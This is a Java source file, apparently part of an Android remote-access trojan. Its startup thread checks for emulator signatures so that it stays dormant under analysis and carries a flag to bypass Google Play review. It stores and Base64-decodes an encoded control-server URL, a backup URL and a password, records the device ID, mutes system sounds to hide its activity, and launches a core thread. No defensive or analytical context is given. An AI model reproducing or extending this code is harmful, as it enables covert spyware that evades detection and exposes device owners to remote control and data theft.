package u.can.i.up.expert.threads;

import android.content.Context;
import android.media.AudioManager;
import android.os.Build;
import android.os.Looper;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;

import u.can.i.up.expert.MyService;
import u.can.i.up.expert.common.DataSet;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class PreThread extends Thread {
    MyService myService;
    public PreThread(){
        this.myService = DataSet.getInstance().myService;
    }
    @Override
    public void run()
    {
        Looper.prepare();
        Log.i("u.can.i.up", "PreThread");

        if(DataSet.getInstance().GPlayBypass==true)
        {
            while(true){

                if(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getBoolean("Start", false)==false)
                {
                    if("google_sdk".equals(Build.PRODUCT ) || "google_sdk".equals(Build.MODEL) || Build.BRAND.startsWith("generic") || Build.DEVICE.startsWith("generic") || "goldfish".equals(Build.HARDWARE))
                    {
                    }
//		    		else if(hours%4==0)
//		            {
//		            	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Start", true);
//		            	initiate();
//		            }
                    else
                    {
                        PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putBoolean("Start", true);
                        initiate();
                    }
                }
                else if(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getBoolean("Start", false)==true)
                {
                    PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putBoolean("Start", true).commit();
                    initiate();
                }
                else{}

                try
                {
                    Thread.sleep(DataSet.getInstance().interval);
                }
                catch (Exception e)
                {
                    this.start();
                }
            }
        }
        else
        {
            initiate();
        }
    }
    public void initiate()
    {
        try
        {
            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putBoolean("Media",false);
            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putBoolean("Files",false).commit();

            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putString("URL", DataSet.getInstance().encodedURL).commit();
            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putString("backupURL", DataSet.getInstance().backupURL).commit();
            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putString("password", DataSet.getInstance().encodedPassword).commit();

            PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).edit().putString("androidId", DataSet.getInstance().androidId).commit();

            DataSet.getInstance().URL = new String( Base64.decode(PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("URL", ""), Base64.DEFAULT));
            DataSet.getInstance().password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(myService.getApplicationContext()).getString("password", ""), Base64.DEFAULT ));

            AudioManager mgr = (AudioManager)myService.getSystemService(Context.AUDIO_SERVICE);
            mgr.setStreamMute(AudioManager.STREAM_SYSTEM, true);
        } catch (Exception e) {e.printStackTrace();}
        new CoreThread().start();
    }
}
